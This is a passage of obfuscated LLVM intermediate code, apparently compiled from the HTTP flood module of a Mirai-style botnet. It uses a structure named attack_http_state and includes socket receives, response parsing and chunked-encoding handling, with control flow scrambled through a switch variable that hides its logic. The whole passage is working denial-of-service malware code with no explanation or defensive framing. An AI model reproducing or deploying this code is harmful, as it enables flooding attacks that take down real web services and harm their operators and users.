  %2228 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2229 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2228, i32 0, i32 1
  %2230 = load i8, i8* %2229, align 4
  %2231 = zext i8 %2230 to i32
  %2232 = icmp eq i32 %2231, 7
  %2233 = select i1 %2232, i32 -698361218, i32 496072937
  store i32 %2233, i32* %switchVar
  br label %loopEnd

; <label>:2234:                                   ; preds = %loopEntry
  store i32 -1593413651, i32* %switchVar
  br label %loopEnd

; <label>:2235:                                   ; preds = %loopEntry
  %2236 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2237 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2236, i32 0, i32 1
  %2238 = load i8, i8* %2237, align 4
  %2239 = zext i8 %2238 to i32
  %2240 = icmp ne i32 %2239, 7
  %2241 = select i1 %2240, i32 2119685316, i32 1852803822
  store i32 %2241, i32* %switchVar
  br label %loopEnd

; <label>:2242:                                   ; preds = %loopEntry
  store i32 666827440, i32* %switchVar
  br label %loopEnd

; <label>:2243:                                   ; preds = %loopEntry
  %2244 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2245 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2244, i32 0, i32 17
  %2246 = load i32, i32* %2245, align 4
  %2247 = icmp eq i32 %2246, 1024
  %2248 = select i1 %2247, i32 1615649178, i32 -2047198933
  store i32 %2248, i32* %switchVar
  br label %loopEnd

; <label>:2249:                                   ; preds = %loopEntry
  %2250 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2251 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2250, i32 0, i32 18
  %2252 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2251, i32 0, i32 0
  %2253 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2254 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2253, i32 0, i32 18
  %2255 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2254, i32 0, i32 0
  %2256 = getelementptr inbounds i8, i8* %2255, i64 64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %2252, i8* %2256, i64 960, i32 1, i1 false)
  %2257 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2258 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2257, i32 0, i32 17
  %2259 = load i32, i32* %2258, align 4
  %2260 = sub nsw i32 %2259, 64
  store i32 %2260, i32* %2258, align 4
  store i32 -2047198933, i32* %switchVar
  br label %loopEnd

; <label>:2261:                                   ; preds = %loopEntry
  %2262 = call i32* @__errno_location() #7
  store i32 0, i32* %2262, align 4
  %2263 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2264 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2263, i32 0, i32 0
  %2265 = load i32, i32* %2264, align 4
  %2266 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2267 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2266, i32 0, i32 18
  %2268 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2267, i32 0, i32 0
  %2269 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2270 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2269, i32 0, i32 17
  %2271 = load i32, i32* %2270, align 4
  %2272 = sext i32 %2271 to i64
  %2273 = getelementptr inbounds i8, i8* %2268, i64 %2272
  %2274 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2275 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2274, i32 0, i32 17
  %2276 = load i32, i32* %2275, align 4
  %2277 = sub nsw i32 1024, %2276
  %2278 = sext i32 %2277 to i64
  %2279 = call i64 @recv(i32 %2265, i8* %2273, i64 %2278, i32 16384)
  %2280 = trunc i64 %2279 to i32
  store i32 %2280, i32* %12, align 4
  %2281 = load i32, i32* %12, align 4
  %2282 = icmp eq i32 %2281, 0
  %2283 = select i1 %2282, i32 1447901388, i32 -1863239706
  store i32 %2283, i32* %switchVar
  br label %loopEnd

; <label>:2284:                                   ; preds = %loopEntry
  %2285 = call i32* @__errno_location() #7
  store i32 104, i32* %2285, align 4
  store i32 -1, i32* %12, align 4
  store i32 -1863239706, i32* %switchVar
  br label %loopEnd

; <label>:2286:                                   ; preds = %loopEntry
  %2287 = load i32, i32* %12, align 4
  %2288 = icmp eq i32 %2287, -1
  %2289 = select i1 %2288, i32 -394776006, i32 -1394950126
  store i32 %2289, i32* %switchVar
  br label %loopEnd

; <label>:2290:                                   ; preds = %loopEntry
  %2291 = call i32* @__errno_location() #7
  %2292 = load i32, i32* %2291, align 4
  %2293 = icmp ne i32 %2292, 11
  %2294 = select i1 %2293, i32 419636586, i32 -794131384
  store i32 %2294, i32* %switchVar
  br label %loopEnd

; <label>:2295:                                   ; preds = %loopEntry
  %2296 = call i32* @__errno_location() #7
  %2297 = load i32, i32* %2296, align 4
  %2298 = icmp ne i32 %2297, 11
  %2299 = select i1 %2298, i32 1112193763, i32 -794131384
  store i32 %2299, i32* %switchVar
  br label %loopEnd

; <label>:2300:                                   ; preds = %loopEntry
  %2301 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2302 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2301, i32 0, i32 0
  %2303 = load i32, i32* %2302, align 4
  %2304 = call i32 @close(i32 %2303)
  %2305 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2306 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2305, i32 0, i32 0
  store i32 -1, i32* %2306, align 4
  %2307 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2308 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2307, i32 0, i32 1
  store i8 0, i8* %2308, align 4
  store i32 -794131384, i32* %switchVar
  br label %loopEnd

; <label>:2309:                                   ; preds = %loopEntry
  store i32 666827440, i32* %switchVar
  br label %loopEnd

; <label>:2310:                                   ; preds = %loopEntry
  %2311 = load i32, i32* %12, align 4
  %2312 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2313 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2312, i32 0, i32 17
  %2314 = load i32, i32* %2313, align 4
  %2315 = add nsw i32 %2314, %2311
  store i32 %2315, i32* %2313, align 4
  %2316 = load i32, i32* %27, align 4
  %2317 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2318 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2317, i32 0, i32 2
  store i32 %2316, i32* %2318, align 4
  store i32 -555281403, i32* %switchVar
  br label %loopEnd

; <label>:2319:                                   ; preds = %loopEntry
  store i32 0, i32* %59, align 4
  %2320 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2321 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2320, i32 0, i32 14
  %2322 = load i32, i32* %2321, align 4
  %2323 = icmp sgt i32 %2322, 0
  %2324 = select i1 %2323, i32 -1584684784, i32 699213300
  store i32 %2324, i32* %switchVar
  br label %loopEnd

; <label>:2325:                                   ; preds = %loopEntry
  %2326 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2327 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2326, i32 0, i32 14
  %2328 = load i32, i32* %2327, align 4
  %2329 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2330 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2329, i32 0, i32 17
  %2331 = load i32, i32* %2330, align 4
  %2332 = icmp sgt i32 %2328, %2331
  %2333 = select i1 %2332, i32 817285092, i32 -1824664076
  store i32 %2333, i32* %switchVar
  br label %loopEnd

; <label>:2334:                                   ; preds = %loopEntry
  %2335 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2336 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2335, i32 0, i32 17
  %2337 = load i32, i32* %2336, align 4
  store i32 -230050385, i32* %switchVar
  store i32 %2337, i32* %.reg2mem53
  br label %loopEnd

; <label>:2338:                                   ; preds = %loopEntry
  %2339 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2340 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2339, i32 0, i32 14
  %2341 = load i32, i32* %2340, align 4
  store i32 -230050385, i32* %switchVar
  store i32 %2341, i32* %.reg2mem53
  br label %loopEnd

; <label>:2342:                                   ; preds = %loopEntry
  %.reload54 = load i32, i32* %.reg2mem53
  store i32 %.reload54, i32* %59, align 4
  %2343 = load i32, i32* %59, align 4
  %2344 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2345 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2344, i32 0, i32 14
  %2346 = load i32, i32* %2345, align 4
  %2347 = sub nsw i32 %2346, %2343
  store i32 %2347, i32* %2345, align 4
  %2348 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2349 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2348, i32 0, i32 11
  %2350 = load i32, i32* %2349, align 4
  %2351 = icmp eq i32 %2350, 1
  %2352 = select i1 %2351, i32 -772723958, i32 -816261079
  store i32 %2352, i32* %switchVar
  br label %loopEnd

; <label>:2353:                                   ; preds = %loopEntry
  %2354 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2355 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2354, i32 0, i32 18
  %2356 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2355, i32 0, i32 0
  %2357 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2358 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2357, i32 0, i32 17
  %2359 = load i32, i32* %2358, align 4
  %2360 = call i8* @table_retrieve_val(i32 36, i32* null)
  %2361 = call i32 @util_memsearch(i8* %2356, i32 %2359, i8* %2360, i32 11)
  %2362 = icmp ne i32 %2361, -1
  %2363 = select i1 %2362, i32 -638514469, i32 1782133513
  store i32 %2363, i32* %switchVar
  br label %loopEnd

; <label>:2364:                                   ; preds = %loopEntry
  %2365 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2366 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2365, i32 0, i32 18
  %2367 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2366, i32 0, i32 0
  %2368 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2369 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2368, i32 0, i32 17
  %2370 = load i32, i32* %2369, align 4
  %2371 = call i8* @table_retrieve_val(i32 36, i32* null)
  %2372 = call i32 @util_memsearch(i8* %2367, i32 %2370, i8* %2371, i32 11)
  store i32 %2372, i32* %60, align 4
  %2373 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2374 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2373, i32 0, i32 18
  %2375 = load i32, i32* %60, align 4
  %2376 = sext i32 %2375 to i64
  %2377 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2374, i64 0, i64 %2376
  %2378 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2379 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2378, i32 0, i32 17
  %2380 = load i32, i32* %2379, align 4
  %2381 = load i32, i32* %60, align 4
  %2382 = sub nsw i32 %2380, %2381
  %2383 = call i32 @util_memsearch(i8* %2377, i32 %2382, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i32 0, i32 0), i32 1)
  store i32 %2383, i32* %61, align 4
  %2384 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2385 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2384, i32 0, i32 18
  %2386 = load i32, i32* %60, align 4
  %2387 = load i32, i32* %61, align 4
  %2388 = sub nsw i32 %2387, 1
  %2389 = add nsw i32 %2386, %2388
  %2390 = sext i32 %2389 to i64
  %2391 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2385, i64 0, i64 %2390
  store i8 0, i8* %2391, align 1
  %2392 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2393 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2392, i32 0, i32 15
  %2394 = load i32, i32* %2393, align 4
  %2395 = icmp slt i32 %2394, 5
  %2396 = select i1 %2395, i32 -1554429947, i32 -519100666
  store i32 %2396, i32* %switchVar
  br label %loopEnd

; <label>:2397:                                   ; preds = %loopEntry
  %2398 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2399 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2398, i32 0, i32 18
  %2400 = load i32, i32* %60, align 4
  %2401 = sext i32 %2400 to i64
  %2402 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2399, i64 0, i64 %2401
  %2403 = call i32 @util_strlen(i8* %2402)
  %2404 = icmp slt i32 %2403, 128
  %2405 = select i1 %2404, i32 -319486367, i32 -519100666
  store i32 %2405, i32* %switchVar
  br label %loopEnd

; <label>:2406:                                   ; preds = %loopEntry
  %2407 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2408 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2407, i32 0, i32 16
  %2409 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2410 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2409, i32 0, i32 15
  %2411 = load i32, i32* %2410, align 4
  %2412 = sext i32 %2411 to i64
  %2413 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %2408, i64 0, i64 %2412
  %2414 = getelementptr inbounds [128 x i8], [128 x i8]* %2413, i32 0, i32 0
  %2415 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2416 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2415, i32 0, i32 18
  %2417 = load i32, i32* %60, align 4
  %2418 = sext i32 %2417 to i64
  %2419 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2416, i64 0, i64 %2418
  %2420 = call i32 @util_strcpy(i8* %2414, i8* %2419)
  %2421 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2422 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2421, i32 0, i32 16
  %2423 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2424 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2423, i32 0, i32 15
  %2425 = load i32, i32* %2424, align 4
  %2426 = sext i32 %2425 to i64
  %2427 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %2422, i64 0, i64 %2426
  %2428 = getelementptr inbounds [128 x i8], [128 x i8]* %2427, i32 0, i32 0
  %2429 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2430 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2429, i32 0, i32 16
  %2431 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2432 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2431, i32 0, i32 15
  %2433 = load i32, i32* %2432, align 4
  %2434 = sext i32 %2433 to i64
  %2435 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %2430, i64 0, i64 %2434
  %2436 = getelementptr inbounds [128 x i8], [128 x i8]* %2435, i32 0, i32 0
  %2437 = call i32 @util_strlen(i8* %2436)
  %2438 = sext i32 %2437 to i64
  %2439 = getelementptr inbounds i8, i8* %2428, i64 %2438
  %2440 = call i32 @util_strcpy(i8* %2439, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.14, i32 0, i32 0))
  %2441 = load i32, i32* %61, align 4
  %2442 = add nsw i32 %2441, 3
  %2443 = load i32, i32* %60, align 4
  %2444 = add nsw i32 %2443, %2442
  store i32 %2444, i32* %60, align 4
  %2445 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2446 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2445, i32 0, i32 18
  %2447 = load i32, i32* %60, align 4
  %2448 = sext i32 %2447 to i64
  %2449 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2446, i64 0, i64 %2448
  %2450 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2451 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2450, i32 0, i32 17
  %2452 = load i32, i32* %2451, align 4
  %2453 = load i32, i32* %60, align 4
  %2454 = sub nsw i32 %2452, %2453
  %2455 = call i32 @util_memsearch(i8* %2449, i32 %2454, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i32 0, i32 0), i32 1)
  store i32 %2455, i32* %61, align 4
  %2456 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2457 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2456, i32 0, i32 18
  %2458 = load i32, i32* %60, align 4
  %2459 = load i32, i32* %61, align 4
  %2460 = sub nsw i32 %2459, 1
  %2461 = add nsw i32 %2458, %2460
  %2462 = sext i32 %2461 to i64
  %2463 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2457, i64 0, i64 %2462
  store i8 0, i8* %2463, align 1
  %2464 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2465 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2464, i32 0, i32 16
  %2466 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2467 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2466, i32 0, i32 15
  %2468 = load i32, i32* %2467, align 4
  %2469 = sext i32 %2468 to i64
  %2470 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %2465, i64 0, i64 %2469
  %2471 = getelementptr inbounds [128 x i8], [128 x i8]* %2470, i32 0, i32 0
  %2472 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2473 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2472, i32 0, i32 16
  %2474 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2475 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2474, i32 0, i32 15
  %2476 = load i32, i32* %2475, align 4
  %2477 = sext i32 %2476 to i64
  %2478 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %2473, i64 0, i64 %2477
  %2479 = getelementptr inbounds [128 x i8], [128 x i8]* %2478, i32 0, i32 0
  %2480 = call i32 @util_strlen(i8* %2479)
  %2481 = sext i32 %2480 to i64
  %2482 = getelementptr inbounds i8, i8* %2471, i64 %2481
  %2483 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2484 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2483, i32 0, i32 18
  %2485 = load i32, i32* %60, align 4
  %2486 = sext i32 %2485 to i64
  %2487 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2484, i64 0, i64 %2486
  %2488 = call i32 @util_strcpy(i8* %2482, i8* %2487)
  %2489 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2490 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2489, i32 0, i32 15
  %2491 = load i32, i32* %2490, align 4
  %2492 = add nsw i32 %2491, 1
  store i32 %2492, i32* %2490, align 4
  store i32 -519100666, i32* %switchVar
  br label %loopEnd

; <label>:2493:                                   ; preds = %loopEntry
  %2494 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2495 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2494, i32 0, i32 14
  store i32 -1, i32* %2495, align 4
  %2496 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2497 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2496, i32 0, i32 1
  store i8 10, i8* %2497, align 4
  store i32 1187789126, i32* %switchVar
  br label %loopEnd

; <label>:2498:                                   ; preds = %loopEntry
  store i32 -816261079, i32* %switchVar
  br label %loopEnd

; <label>:2499:                                   ; preds = %loopEntry
  store i32 699213300, i32* %switchVar
  br label %loopEnd

; <label>:2500:                                   ; preds = %loopEntry
  %2501 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2502 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2501, i32 0, i32 14
  %2503 = load i32, i32* %2502, align 4
  %2504 = icmp eq i32 %2503, 0
  %2505 = select i1 %2504, i32 1985074841, i32 1987628545
  store i32 %2505, i32* %switchVar
  br label %loopEnd

; <label>:2506:                                   ; preds = %loopEntry
  %2507 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2508 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2507, i32 0, i32 13
  %2509 = load i32, i32* %2508, align 4
  %2510 = icmp eq i32 %2509, 1
  %2511 = select i1 %2510, i32 596308387, i32 1086450151
  store i32 %2511, i32* %switchVar
  br label %loopEnd

; <label>:2512:                                   ; preds = %loopEntry
  %2513 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2514 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2513, i32 0, i32 18
  %2515 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2514, i32 0, i32 0
  %2516 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2517 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2516, i32 0, i32 17
  %2518 = load i32, i32* %2517, align 4
  %2519 = call i32 @util_memsearch(i8* %2515, i32 %2518, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  %2520 = icmp ne i32 %2519, -1
  %2521 = select i1 %2520, i32 -141207081, i32 2136823929
  store i32 %2521, i32* %switchVar
  br label %loopEnd

; <label>:2522:                                   ; preds = %loopEntry
  %2523 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2524 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2523, i32 0, i32 18
  %2525 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2524, i32 0, i32 0
  %2526 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2527 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2526, i32 0, i32 17
  %2528 = load i32, i32* %2527, align 4
  %2529 = call i32 @util_memsearch(i8* %2525, i32 %2528, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %2529, i32* %62, align 4
  %2530 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2531 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2530, i32 0, i32 18
  %2532 = load i32, i32* %62, align 4
  %2533 = sub nsw i32 %2532, 2
  %2534 = sext i32 %2533 to i64
  %2535 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2531, i64 0, i64 %2534
  store i8 0, i8* %2535, align 1
  %2536 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2537 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2536, i32 0, i32 18
  %2538 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2537, i32 0, i32 0
  %2539 = load i32, i32* %62, align 4
  %2540 = call i32 @util_memsearch(i8* %2538, i32 %2539, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i32 0, i32 0), i32 1)
  %2541 = icmp ne i32 %2540, -1
  %2542 = select i1 %2541, i32 -1709329567, i32 -1700043646
  store i32 %2542, i32* %switchVar
  br label %loopEnd

; <label>:2543:                                   ; preds = %loopEntry
  %2544 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2545 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2544, i32 0, i32 18
  %2546 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2547 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2546, i32 0, i32 18
  %2548 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2547, i32 0, i32 0
  %2549 = load i32, i32* %62, align 4
  %2550 = call i32 @util_memsearch(i8* %2548, i32 %2549, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i32 0, i32 0), i32 1)
  %2551 = sext i32 %2550 to i64
  %2552 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2545, i64 0, i64 %2551
  store i8 0, i8* %2552, align 1
  store i32 -1700043646, i32* %switchVar
  br label %loopEnd

; <label>:2553:                                   ; preds = %loopEntry
  %2554 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2555 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2554, i32 0, i32 18
  %2556 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2555, i32 0, i32 0
  %2557 = call i32 @util_atoi(i8* %2556, i32 16)
  store i32 %2557, i32* %63, align 4
  %2558 = load i32, i32* %63, align 4
  %2559 = icmp eq i32 %2558, 0
  %2560 = select i1 %2559, i32 144198999, i32 -567820323
  store i32 %2560, i32* %switchVar
  br label %loopEnd

; <label>:2561:                                   ; preds = %loopEntry
  %2562 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2563 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2562, i32 0, i32 1
  store i8 1, i8* %2563, align 4
  store i32 1187789126, i32* %switchVar
  br label %loopEnd

; <label>:2564:                                   ; preds = %loopEntry
  %2565 = load i32, i32* %63, align 4
  %2566 = add nsw i32 %2565, 2
  %2567 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2568 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2567, i32 0, i32 14
  store i32 %2566, i32* %2568, align 4
  %2569 = load i32, i32* %62, align 4
  store i32 %2569, i32* %59, align 4
  store i32 2136823929, i32* %switchVar
  br label %loopEnd

; <label>:2570:                                   ; preds = %loopEntry
  store i32 939585644, i32* %switchVar
  br label %loopEnd

; <label>:2571:                                   ; preds = %loopEntry
  %2572 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2573 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2572, i32 0, i32 17
  %2574 = load i32, i32* %2573, align 4
  %2575 = load i32, i32* %59, align 4
  %2576 = sub nsw i32 %2574, %2575
  %2577 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2578 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2577, i32 0, i32 14
  store i32 %2576, i32* %2578, align 4
  %2579 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2580 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2579, i32 0, i32 14
  %2581 = load i32, i32* %2580, align 4
  %2582 = icmp eq i32 %2581, 0
  %2583 = select i1 %2582, i32 -724744725, i32 -1720135153
  store i32 %2583, i32* %switchVar
  br label %loopEnd

; <label>:2584:                                   ; preds = %loopEntry
  %2585 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2586 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2585, i32 0, i32 1
  store i8 1, i8* %2586, align 4
  store i32 1187789126, i32* %switchVar
  br label %loopEnd

; <label>:2587:                                   ; preds = %loopEntry
  store i32 939585644, i32* %switchVar
  br label %loopEnd

; <label>:2588:                                   ; preds = %loopEntry
  store i32 1987628545, i32* %switchVar
  br label %loopEnd

; <label>:2589:                                   ; preds = %loopEntry
  %2590 = load i32, i32* %59, align 4
  %2591 = icmp eq i32 %2590, 0
  %2592 = select i1 %2591, i32 -708292828, i32 973576685
  store i32 %2592, i32* %switchVar
  br label %loopEnd

; <label>:2593:                                   ; preds = %loopEntry
  store i32 1187789126, i32* %switchVar
  br label %loopEnd

; <label>:2594:                                   ; preds = %loopEntry
  %2595 = load i32, i32* %59, align 4
  %2596 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2597 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2596, i32 0, i32 17
  %2598 = load i32, i32* %2597, align 4
  %2599 = sub nsw i32 %2598, %2595
  store i32 %2599, i32* %2597, align 4
  %2600 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2601 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2600, i32 0, i32 18
  %2602 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2601, i32 0, i32 0
  %2603 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2604 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2603, i32 0, i32 18
  %2605 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2604, i32 0, i32 0
  %2606 = load i32, i32* %59, align 4
  %2607 = sext i32 %2606 to i64
  %2608 = getelementptr inbounds i8, i8* %2605, i64 %2607
  %2609 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2610 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2609, i32 0, i32 17
  %2611 = load i32, i32* %2610, align 4
  %2612 = sext i32 %2611 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %2602, i8* %2608, i64 %2612, i32 1, i1 false)
  %2613 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2614 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2613, i32 0, i32 18
  %2615 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
